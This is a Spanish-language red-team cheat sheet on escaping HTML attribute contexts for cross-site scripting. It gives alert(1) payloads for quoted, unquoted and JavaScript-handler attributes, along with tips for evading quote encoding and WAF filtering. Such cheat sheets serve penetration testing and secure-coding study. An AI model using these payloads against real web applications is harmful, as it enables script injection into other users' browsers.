---
aliases: null
tags:
  - type/technique
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
tertiary categories:
  - '[[Web Explotación]]'
kind: SubCheatSheet
linked:
  - '[[Cross-Site Scripting (XSS)]]'
---
# XSS - Escape de Contexto en Atributos

***
## Cheatsheet

|**Contexto / Delimitador**|**Payload de Ejemplo**|**Resultado en el DOM y Notas**|
|---|---|---|
|Comillas dobles (`"`)|`"><script>alert(1)</script>`|Rompe el atributo y cierra la etiqueta anfitriona para iniciar un nuevo bloque de script. Ej: `<input value=""><script>alert(1)</script>">`|
|Comillas simples (`'`)|`'><script>alert(1)</script>`|Idéntico al anterior, pero adaptado cuando la aplicación utiliza comillas simples para delimitar sus atributos.|
|Inyección de nuevo atributo|`" autofocus onfocus="alert(1)`|No rompe la etiqueta anfitriona. Añade atributos de eventos para ejecutar el código en el contexto del elemento actual. Ej: `<input value="" autofocus onfocus="alert(1)">`|
|Atributos ocultos (`hidden`)|`" type="text" onmouseover="alert(1)`|Sobrescribe propiedades restrictivas. Al inyectar `type="text"`, convierto un campo oculto en uno interactivo para disparar el evento.|
|Atributos sin comillas|`x onmouseover=alert(1)`|Ocurre cuando el HTML está mal formado (ej. `<input value=INYECCIÓN>`). Un simple espacio es suficiente para escapar e introducir un nuevo atributo.|
|Dentro de un manejador JS|`');alert(1);//`|Escape directo dentro de un atributo que ya ejecuta JavaScript (ej. `<button onclick="func('INYECCIÓN')">`). Cierra la función legítima y comenta el resto.|

^xss-atributos

### Mecánicas de Ruptura Estructural

Para que la inyección sea exitosa, debo analizar cómo la aplicación web envuelve mi entrada en el código fuente y replicar esos caracteres de cierre en mi payload.

- **Ruptura Total (Cierre de Etiqueta):** Si la aplicación no filtra los caracteres de mayor y menor que (`<`, `>`), la vía más directa es inyectar el delimitador de comillas correspondiente, seguido del cierre de la etiqueta actual, y luego introducir el payload clásico.
    - Inyección en: `<input type="text" name="user" value="INYECCIÓN">`
    - Payload: `"><svg onload=alert(1)>`
    
- **Ruptura Parcial (Inyección de Atributos):** Si los caracteres `<` o `>` están bloqueados por un WAF o codificados en entidades HTML, recurro a mantener viva la etiqueta original pero mutando sus propiedades. Solo necesito inyectar una comilla y un espacio para separar mi nuevo atributo del original.
    - Inyección en: `<input type="text" name="user" value="INYECCIÓN">`
    - Payload: `" onfocus="alert(1)`

### Evasión de Validaciones de Comillas

Las defensas más comunes codifican las comillas (`"` a `&quot;`) para evitar que rompa la estructura del atributo. Existen escenarios específicos donde puedo eludir esta restricción:

- **HTML Mal Formado (Sin Comillas):** Si el desarrollador omitió envolver el valor del atributo entre comillas (ej. `<img src=INYECCIÓN>`), el navegador utiliza los espacios en blanco como delimitadores. Puedo escapar simplemente inyectando un espacio seguido de mi manejador de eventos: `x onerror=alert(1)`.
    
- **Inyección en Atributos de Ejecución Dinámica:** Si estoy atrapado dentro de atributos como `href` o `action` y las comillas están bloqueadas, derivo el ataque hacia la inyección a través de pseudo-protocolos (`javascript:`), donde no necesito escapar del contexto del atributo, sino controlar el esquema de la URL.


___

## Overview

Cuando la entrada que suministro se refleja directamente dentro de las propiedades de una etiqueta HTML existente (como `value`, `class`, `placeholder` o `href`), el ataque de [[Cross-Site Scripting (XSS)]] requiere una fase previa de preparación: el escape de contexto. No puedo simplemente inyectar una etiqueta `<script>` porque el motor del navegador interpretará mi código como una simple cadena de texto perteneciente al atributo.

El objetivo central de esta técnica es manipular la sintaxis esperada por el analizador léxico (parser) del navegador, inyectando los caracteres exactos que cierran prematuramente el atributo actual y, dependiendo del escenario, cerrar la etiqueta anfitriona completa o abrir espacio para inyectar manejadores de eventos maliciosos.

